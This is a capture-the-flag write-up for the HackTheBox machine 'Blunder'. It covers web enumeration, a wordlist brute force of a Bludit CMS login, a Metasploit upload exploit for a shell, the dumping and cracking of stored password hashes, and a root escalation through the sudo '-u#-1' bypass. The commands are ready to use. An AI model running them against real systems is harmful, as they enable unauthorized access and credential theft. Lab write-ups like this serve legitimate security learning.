# Blunder
## Linux
### HackTheBox
### Easy

* Host: blunder.htb

### NMAP
```
80/tcp http Apache httpd 2.4.41 ((Ubuntu))
  http-generator: Blunder
  http-server-header: Apache/2.4.41 (Ubuntu)
  http-methods:
    Supported Methods: GET HEAD POST OPTIONS
  http-title: Blunder | A blunder of interesting facts
  http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
```

### http://blunder.htb
__Directories__
```Console
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://blunder.htb
 📖  Wordlist              │ /SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 💥  Timeout (secs)        │ 7
 💲  Extensions            │ [php, html, txt]
───────────────────────────┴──────────────────────
200      105l      303w     3290c http://blunder.htb/about
200      170l      918w     7573c http://blunder.htb/0
301        0l        0w        0c http://blunder.htb/admin
200        1l        5w       30c http://blunder.htb/install.php
200        2l        4w       22c http://blunder.htb/robots.txt
200        4l       23w      118c http://blunder.htb/todo.txt
200      110l      387w     3969c http://blunder.htb/usb
200       21l      171w     1083c http://blunder.htb/LICENSE
403        9l       28w      276c http://blunder.htb/server-status
200      170l      918w     7573c http://blunder.htb/%3FRID%3D2671
200      170l      918w     7573c http://blunder.htb/%3FRID%3D2671.php
200      170l      918w     7573c http://blunder.htb/%3FRID%3D2671.html
200      170l      918w     7573c http://blunder.htb/%3FRID%3D2671.txt
```
__Nikto__
```
"robots.txt" contains 1 entry which should be manually viewed.
Web Server returns a valid response with junk HTTP methods, this may cause false positives.
/admin/config.php: PHP Config file may contain database IDs and passwords.
/admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) log file is readable remotely. Upgrade to the latest version.
/admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
OSVDB-5034: /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify.
OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.
OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.
OSVDB-3092: /admin/: This might be interesting...
OSVDB-3093: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/cfg/configscreen.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/cfg/configsql.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/cfg/configtache.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/cms/htmltags.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/credit_card_info.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/exec.php3: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/modules/cache.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/script.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/settings.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/templates/header.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-3093: /admin/upload.php: This might be interesting... has been seen in web logs from an unknown scanner.
OSVDB-4238: /admin/adminproc.asp: Xpede administration page may be available. The /admin directory should be protected.
OSVDB-4239: /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.
OSVDB-9624: /admin/admin.php?adminpy=1: PY-Membres 4.2 may allow administrator access.
OSVDB-3092: /install.php: install.php file found.
/admin/account.asp: Admin login page/section found.
/admin/account.html: Admin login page/section found.
/admin/account.php: Admin login page/section found.
/admin/controlpanel.asp: Admin login page/section found.
/admin/controlpanel.html: Admin login page/section found.
/admin/controlpanel.php: Admin login page/section found.
/admin/cp.asp: Admin login page/section found.
/admin/cp.html: Admin login page/section found.
/admin/cp.php: Admin login page/section found.
/admin/home.asp: Admin login page/section found.
/admin/home.php: Admin login page/section found.
/admin/index.asp: Admin login page/section found.
/admin/index.html: Admin login page/section found.
/admin/login.asp: Admin login page/section found.
/admin/login.html: Admin login page/section found.
/admin/login.php: Admin login page/section found.
/admin/html: Tomcat Manager / Host Manager interface found (pass protected)
/admin/status: Tomcat Server Status interface found (pass protected)
```

__Robots.txt__
```
User-agent: *
Allow: /
```

__todo.txt__
```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

### http://blunder.htb/admin/
Login for a page: BLUDIT
 * Nothing in the page source

From [Bludit.com](https://www.bludit.com/)
> Create your own Website or Blog in seconds
> 
> Simple, Fast, Secure, Flat-File CMS

Found an authentication brute-force bypass in SearchSploit - php/webapps/48942.py
 * Issues running, even in `pyenv`

More enumeration!

### http://blunder.htb
__Directories__
```
301        0l        0w        0c http://blunder.htb/.git/logs/
200       28l       28w      563c http://blunder.htb/.gitignore
200      170l      918w     7573c http://blunder.htb/0
200       21l      171w     1083c http://blunder.htb/LICENSE
200      105l      303w     3290c http://blunder.htb/about
301        0l        0w        0c http://blunder.htb/admin
301        0l        0w        0c http://blunder.htb/cgi-bin/
200        1l        5w       30c http://blunder.htb/install.php
200        2l        4w       22c http://blunder.htb/robots.txt
200        4l       23w      118c http://blunder.htb/todo.txt
```
__.gitignore__
```
.DS_Store
dbgenerator.php
bl-content/*
bl-content-migrator
bl-plugins/timemachine
bl-plugins/timemachine-x
bl-plugins/discovery
bl-plugins/updater
bl-plugins/medium-editor
bl-plugins/quill
bl-plugins/yandex-metrica/
bl-plugins/domain-migrator/
bl-plugins/tail-writer/
bl-kernel/bludit.pro.php
bl-kernel/admin/themes/gris
bl-themes/docs
bl-themes/docsx
bl-themes/editorial
bl-themes/mediumish
bl-themes/clean-blog
bl-themes/grayscale
bl-themes/massively
bl-themes/hyperspace
bl-themes/striped
bl-themes/log
bl-themes/micro
bl-themes/tagg
bl-themes/future-imperfect
```

__install.php__
```Console
╰─❯ curl http://blunder.htb/install.php
Bludit is already installed ;)
```

Brute-forcing the login using a password list created in [CeWL](https://github.com/digininja/CeWL)
 * see `passwords.txt` in `/files`
 * use login "fergus" based on `todo.txt`

Used python script in [this blog post](https://blog.void.yt/HTB/Easy/47.html)
 * edit the host to the IP address
 * edit username to "fergus"
 * run `cat password.txt | wc -l`, should have 350 words.
 * Update the range in the script to 350 words in the `for` loop

Found password
User: fergus
Password: RolandDeschain
[Someone is a Stephen King fan. Roland Deschain is the main character in the Dark Tower series]

### User
1. Open `msfconsole` and use the exploit: `linux/http/bludit_upload_images_exec`
2. Run exploit. Should open meterpreter session as user `www-data`
3. I dropped into a shell and used `python3 -c "import pty; pty.spawn('/bin/bash')"` to start an interactive shell because I hate meterpreter in Linux.
4. Dig around the file directories that `www-data` has access to.

Found `/var/www/bludit-3.9.2/bl-content/databases`

```json
{
    "admin": {
        "nickname": "Admin",
        "firstName": "Administrator",
        "lastName": "",
        "role": "admin",
        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
        "salt": "5dde2887e7aca",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""
    },
    "fergus": {
        "firstName": "",
        "lastName": "",
        "nickname": "",
        "description": "",
        "role": "author",
        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
        "salt": "jqxpjfnv",
        "email": "",
        "registered": "2019-11-27 13:26:44",
        "tokenRemember": "",
        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "codepen": "",
        "instagram": "",
        "github": "",
        "gitlab": "",
        "linkedin": "",
        "mastodon": ""
    }
```

password: bfcc887f62e36ea019e3295aafb8a3885966e265
password: be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7

salt: 5dde2887e7aca
salt: jqxpjfnv

user: admin
user: fergus

Made a separate file for `users`, `hashes`, and `salts`

__Another User__
I thought it was odd we had a login for shaun but not hugo. Checked for other database files and found one at `/var/www/bludit-3.10.0a/bl-content/databases/users.php`
```json
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

So, `hugo` is `admin`

User: admin
hash: faca404fd5c0a31cf1897b823c695c85cffeb98d
salt: none!

Hugo's password is unencrypted. Ran it through JtR and then entered it into [Crackstation.net](http://crackstation.net)
 * Crackstation came thorugh first with the result
 * password: Password120

`su hugo` with the password above

```console
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
```
went to `/home/hugo` and obtained `user.txt`
User flag: bf5+++++++~[takeAbreath]+++++++

### Hugo
Can't SSH as that port isn't open.

Checked `sudo -l`

```Console
hugo@blunder:~/.ssh$ sudo -l
sudo -l
Password: Password210

Sorry, try again.
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

Don't have access to `su` with his username
```console
hugo@blunder:~/.ssh$ sudo --version
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1
```
Checked this version in `searchsploit`. It is exploitable. Googled 'sudo 1.8.25p1 privilege escalation and [this article](https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/) came up as the first result. It explains the vulnerability:
> ...it appears that this vulnerability allows to bypass Sudo rules that have been setup with the “!” symbol, to specify that a user should not
> be able to run a certain command as root (or any other user). The syntax of Sudo rules is as follows:
> 
>     The user the rule applies to
>     The user/group the command can be executed as
>     The allowed command(s)
> 
> For example:
> 
> `john (jack, jack) cp`
> 
> The above willl mean that the john user can execute the “cp” command as the jack user/group
> 
> Through this exploit, the rule can be bypassed by issuing the following command:
> 
> `sudo -u#-1 [command to execute]`
> 
> This exploit is possible because this version of Sudo doesn’t validate if the user ID specified using the -u flag actually exists and it
> executes the command using an arbitrary user id with root privileges, and since -u#-1 returns 0, which is the user id of the root user,
> commands are therefore executed as root.

```Console
hugo@blunder:~/Desktop$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password210
root@blunder:/home/hugo/Desktop# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```
Root flag: c06+++++++~[takeAbreath]+++++++

Pwned by:
```ascii
〸闩长🝗闩⻏尺🝗闩〸卄
```
